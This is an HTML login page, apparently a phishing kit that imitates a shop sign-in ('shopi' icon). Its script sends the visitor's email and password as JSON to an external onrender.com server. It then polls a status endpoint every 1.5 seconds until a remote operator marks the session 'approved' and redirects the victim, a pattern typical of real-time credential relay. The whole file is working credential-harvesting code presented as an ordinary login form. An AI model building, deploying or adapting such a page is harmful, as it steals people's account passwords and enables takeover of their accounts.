<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
        <link rel="icon" type="image/png" href="res/shopi.png">
    <link rel="stylesheet" href="res/app.css">
    <style>
        .spinner-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn-spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid white;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error {
            border-color: #ff4444 !important;
        }
        
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
    </style>
</head>
<body>    

<main>
    <div class="form">
        <div class="logo">
            <img src="res/logo.png" alt="Logo">
        </div>

        <div class="text">
            <h2>Sign in</h2>
            <span>Please enter your login details</span>
        </div>

        <div class="col">
            <label>Email</label>
            <input type="text" id="u" placeholder="Enter your email">
        </div>

        <div class="col">
            <label>Password</label>
            <input type="password" id="p" placeholder="Enter your password">
            <a href="#">Forgot password?</a>
        </div>

        <div class="col">
            <button id="loginBtn" onclick="sendLogin()">
                <span class="spinner-btn">
                    <span class="btn-text">Login</span>
                    <span class="btn-spinner" id="btnSpinner"></span>
                </span>
            </button>
        </div>

        <div class="col links">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
        </div>
    </div>
</main>

<script>
let sessionId = null;
let checkInterval = null;

function showButtonSpinner() {
    $("#btnSpinner").show();
    $("#loginBtn").prop("disabled", true);
    $(".btn-text").text("Verifying...");
}

function hideButtonSpinner() {
    $("#btnSpinner").hide();
    $("#loginBtn").prop("disabled", false);
    $(".btn-text").text("Login");
}

function checkStatus() {
    if (!sessionId) return;
    
    $.ajax({
        url: `https://shopy-fbwo.onrender.com/status/${sessionId}`,
        method: 'GET',
        success: function(response) {
            if (response.status === "approved") {
                clearInterval(checkInterval);
                hideButtonSpinner();
                window.location.href = response.redirect_url;
            }
        },
        error: function(xhr) {
            if (xhr.status === 404) {
                clearInterval(checkInterval);
                hideButtonSpinner();
                alert("Session expired. Please try again.");
            }
        }
    });
}

function sendLogin() {
    $("input").removeClass("error");

    const username = $("#u").val().trim();
    const password = $("#p").val().trim();

    if (!username) {
        $("#u").addClass("error");
        alert("Please enter your email");
        return;
    }

    if (!password) {
        $("#p").addClass("error");
        alert("Please enter your password");
        return;
    }

    showButtonSpinner();

    if (checkInterval) clearInterval(checkInterval);

    $.ajax({
        url: 'https://shopy-fbwo.onrender.com/login',
        method: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({
            login: username,
            password: password
        }),
        success: function(response) {
            if (response.success) {
                sessionId = response.id;
                checkInterval = setInterval(checkStatus, 1500);
                setTimeout(checkStatus, 500);
                
                // Auto timeout after 5 minutes
                setTimeout(function() {
                    if (checkInterval) {
                        clearInterval(checkInterval);
                        hideButtonSpinner();
                        alert("Request timed out. Please try again.");
                    }
                }, 300000);
                
            } else {
                hideButtonSpinner();
                alert("Login failed. Please try again.");
            }
        },
        error: function(xhr, status, error) {
            hideButtonSpinner();
            console.error("Error details:", xhr.responseText, status, error);
            alert("Connection error. Please check console for details.");
        }
    });
}

$("input").keypress(function (e) {
    if (e.key === "Enter") {
        sendLogin();
    }
});

$(window).on('beforeunload', function() {
    if (checkInterval) clearInterval(checkInterval);
});
</script>

</body>
</html>
